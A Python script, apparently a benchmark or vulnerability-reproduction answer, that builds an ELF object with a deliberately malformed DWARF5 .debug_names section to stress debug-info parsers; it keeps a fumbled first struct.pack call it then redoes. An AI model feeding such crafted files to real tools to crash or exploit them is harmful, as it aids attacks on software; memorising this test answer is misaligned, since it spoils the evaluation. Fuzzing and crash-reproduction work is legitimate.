import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def build_debug_names_section() -> bytes:
            # DWARF5 .debug_names with crafted fields to stress parser limits
            # Header fields (DWARF32):
            # unit_length (u32), version (u16), padding (u16),
            # comp_unit_count (u32), local_type_unit_count (u32), foreign_type_unit_count (u32),
            # bucket_count (u32), name_count (u32), abbrev_table_size (u32), entry_pool_size (u32)
            version = 5
            padding = 0
            comp_unit_count = 1
            local_tu_count = 0
            foreign_tu_count = 0
            bucket_count = 1
            name_count = 1
            abbrev_table_size = 0
            entry_pool_size = 1

            # Arrays/sublists based on counts
            cu_offsets = struct.pack("<I", 0)  # one CU offset (DWARF32)
            local_tu_offsets = b""  # none
            foreign_tu_signatures = b""  # none
            buckets = struct.pack("<I", 1)  # one bucket pointing to first name index (1-based)
            name_indexes = struct.pack("<I", 0)  # one name at offset 0 into entry pool

            abbrev_table = b""  # size 0 to exercise boundary/limit logic
            entry_pool = b"\x00"  # minimal entry pool

            # Compute unit_length = size after the length field
            header_rest = struct.pack(
                "<HHIIIIIIII",
                version,
                padding,
                comp_unit_count,
                local_tu_count,
                foreign_tu_count,
                bucket_count,
                name_count,
                abbrev_table_size,
                entry_pool_size,
                0  # Extra placeholder if needed? No, we should not add it. Adjusting below.
            )
            # The above included one extra u32 inadvertently; rebuild correctly:
            header_rest = struct.pack(
                "<HHIIIIIII",
                version,
                padding,
                comp_unit_count,
                local_tu_count,
                foreign_tu_count,
                bucket_count,
                name_count,
                abbrev_table_size,
                entry_pool_size,
            )

            body = (
                header_rest +
                cu_offsets +
                local_tu_offsets +
                foreign_tu_signatures +
                buckets +
                name_indexes +
                abbrev_table +
                entry_pool
            )
            unit_length = struct.pack("<I", len(body))
            return unit_length + body

        def build_elf_with_debug_names(debug_names: bytes) -> bytes:
            # ELF64 little-endian, ET_REL, x86_64
            EI_MAG = b"\x7fELF"
            EI_CLASS_64 = 2
            EI_DATA_LSB = 1
            EI_VERSION = 1
            EI_OSABI_SYSV = 0
            EI_ABIVERSION = 0
            e_ident = EI_MAG + bytes([
                EI_CLASS_64,
                EI_DATA_LSB,
                EI_VERSION,
                EI_OSABI_SYSV,
                EI_ABIVERSION
            ]) + b"\x00" * 7  # padding to 16 bytes

            e_type = 1  # ET_REL
            e_machine = 62  # EM_X86_64
            e_version = 1
            e_entry = 0
            e_phoff = 0
            e_flags = 0
            e_ehsize = 64
            e_phentsize = 0
            e_phnum = 0
            e_shentsize = 64

            # Build .shstrtab
            shstrtab = b"\x00.shstrtab\x00.debug_names\x00"
            shstrtab_name_off = 1
            debug_names_name_off = 1 + len(".shstrtab") + 1  # after .shstrtab\0

            # Offsets
            elf_header_size = e_ehsize
            shstrtab_offset = elf_header_size
            shstrtab_size = len(shstrtab)
            debug_names_offset = shstrtab_offset + shstrtab_size
            debug_names_size = len(debug_names)
            # Section header table follows sections
            shoff = debug_names_offset + debug_names_size

            # Section headers: NULL, .shstrtab, .debug_names
            e_shnum = 3
            e_shstrndx = 1

            elf_header = struct.pack(
                "<16sHHIQQQIHHHHHH",
                e_ident, e_type, e_machine, e_version,
                e_entry, e_phoff, shoff, e_flags,
                e_ehsize, e_phentsize, e_phnum,
                e_shentsize, e_shnum, e_shstrndx
            )

            # SHT types
            SHT_NULL = 0
            SHT_PROGBITS = 1
            SHT_STRTAB = 3

            # Null section header
            sh_null = struct.pack(
                "<IIQQQQIIQQ",
                0, SHT_NULL, 0, 0, 0, 0, 0, 0, 0, 0
            )

            # .shstrtab
            sh_shstrtab = struct.pack(
                "<IIQQQQIIQQ",
                shstrtab_name_off,  # sh_name
                SHT_STRTAB,         # sh_type
                0,                  # sh_flags
                0,                  # sh_addr
                shstrtab_offset,    # sh_offset
                shstrtab_size,      # sh_size
                0,                  # sh_link
                0,                  # sh_info
                1,                  # sh_addralign
                0                   # sh_entsize
            )

            # .debug_names
            sh_debug_names = struct.pack(
                "<IIQQQQIIQQ",
                debug_names_name_off,   # sh_name
                SHT_PROGBITS,           # sh_type
                0,                      # sh_flags
                0,                      # sh_addr
                debug_names_offset,     # sh_offset
                debug_names_size,       # sh_size
                0,                      # sh_link
                0,                      # sh_info
                1,                      # sh_addralign
                0                       # sh_entsize
            )

            section_headers = sh_null + sh_shstrtab + sh_debug_names

            return elf_header + (b"\x00" * (shstrtab_offset - len(elf_header))) + shstrtab + debug_names + section_headers

        debug_names = build_debug_names_section()
        elf = build_elf_with_debug_names(debug_names)
        return elf
